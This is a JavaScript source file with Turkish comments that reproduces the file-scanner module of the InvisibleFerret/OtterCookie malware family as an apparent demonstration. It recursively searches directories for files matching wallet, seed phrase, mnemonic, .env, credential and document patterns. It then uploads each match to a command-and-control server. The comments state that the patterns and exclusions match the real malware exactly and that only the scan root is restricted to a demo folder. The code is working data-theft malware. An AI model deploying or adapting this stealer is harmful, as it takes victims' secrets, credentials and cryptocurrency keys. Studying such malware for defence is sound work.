"use strict";

/**
 * filescanner.js
 * --------------
 * RAPORDAKİ KARŞILIĞI: InvisibleFerret/OtterCookie ailesinin JS dosya
 * tarayıcısı -- sürücüleri/dizinleri özyinelemeli olarak tarar, dosya
 * adlarını joker karakterli desenlerle (wallet, seed, .env, .pdf, ...)
 * eşleştirir ve eşleşenleri C2'ye yükler.
 *
 * KASITLI FARK: rapordaki gerçek script `os.userInfo().homedir` veya tüm
 * mantıksal sürücüleri (wmic logicaldisk get name) kök alarak TÜM
 * KİŞİSEL DOSYA SİSTEMİNİ tarıyordu. Burada tarama kökü bilinçli olarak
 * bu repodaki `demo-victim-data/` klasörüyle sınırlandırıldı (bkz.
 * config.js -> scanRootDir). Dışlama listesi ve joker karakter eşleştirme
 * mantığı ise rapordakiyle BİREBİR aynı -- bu demo, tekniğin kendisini
 * (nasıl arandığını) tam sadakatle gösterir, sadece taranan alanı güvenli
 * bir sınıra hapseder.
 */

const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");
const config = require("./config");

// Rapordaki excludeFolders listesinin birebir eşleniği (kısaltılmadan).
const EXCLUDE_FOLDERS = [
  "node_modules", "npm", "hooks", "android", "example", "AppData", "vendors",
  "vendor", "public", "css", "less", "scss", ".cache", ".conda", ".ssh",
  ".git", ".github", "cache", "tmp", "temp", "dist", "build", ".next",
  ".vscode", "package-lock.json", "Program Files", "Program Files (x86)",
  "ProgramData", "Windows", "Microsoft", "$RECYCLE.BIN",
];

// Rapordaki searchKey desenlerinin (kimlik bilgisi/sır/kripto + doküman/
// görsel/kaynak kod) birebir eşleniği.
const SEARCH_PATTERNS = [
  "*.env*", "*metamask*", "*phantom*", "*bitcoin*", "*trust*", "*phrase*",
  "*secret*", "*credential*", "*profile*", "*account*", "*mnemonic*",
  "*seed*", "*recovery*", "*backup*", "*address*", "*keypair*", "*wallet*",
  "*.doc", "*.docx", "*.pdf", "*.md", "*.xls", "*.xlsx", "*.txt", "*.ini",
  "*.json",
];

function isFileMatching(filename) {
  return SEARCH_PATTERNS.some((pattern) => {
    const regex = new RegExp("^" + pattern.replace(/\./g, "\\.").replace(/\*/g, ".*") + "$", "i");
    return regex.test(filename);
  });
}

/** Eşleşen bir dosyayı, rapordaki gibi multipart/form-data ile C2'ye yükler. */
async function uploadFile(filePath) {
  const form = new FormData();
  form.append("file", fs.createReadStream(filePath));
  form.append("uid", config.demoCampaignId);
  form.append("originalPath", filePath);
  try {
    await axios.post(`${config.c2HttpBase}/upload`, form, { headers: form.getHeaders() });
    console.log(`[demo] Eşleşen dosya C2'ye yüklendi: ${path.basename(filePath)}`);
  } catch (err) {
    console.log(`[demo] Yükleme başarısız (C2 kapalı olabilir): ${path.basename(filePath)}`);
  }
}

function scanDir(dir) {
  if (!fs.existsSync(dir)) return;
  for (const entry of fs.readdirSync(dir)) {
    const fullPath = path.join(dir, entry);
    if (EXCLUDE_FOLDERS.some((ex) => fullPath.toLowerCase().includes(ex.toLowerCase()))) continue;

    const stat = fs.statSync(fullPath);
    if (stat.isDirectory()) {
      scanDir(fullPath);
    } else if (stat.isFile() && isFileMatching(entry)) {
      uploadFile(fullPath);
    }
  }
}

function main() {
  console.log(`[demo] filescanner.js -- tarama kökü (bilinçli olarak sınırlı): ${config.scanRootDir}`);
  // Rapordaki "wmic logicaldisk get name" ile tüm sürücüleri dolaşma adımı
  // burada YOK -- kök dizin sabit ve demo klasörüyle sınırlı (yukarıdaki not).
  scanDir(config.scanRootDir);
}

main();
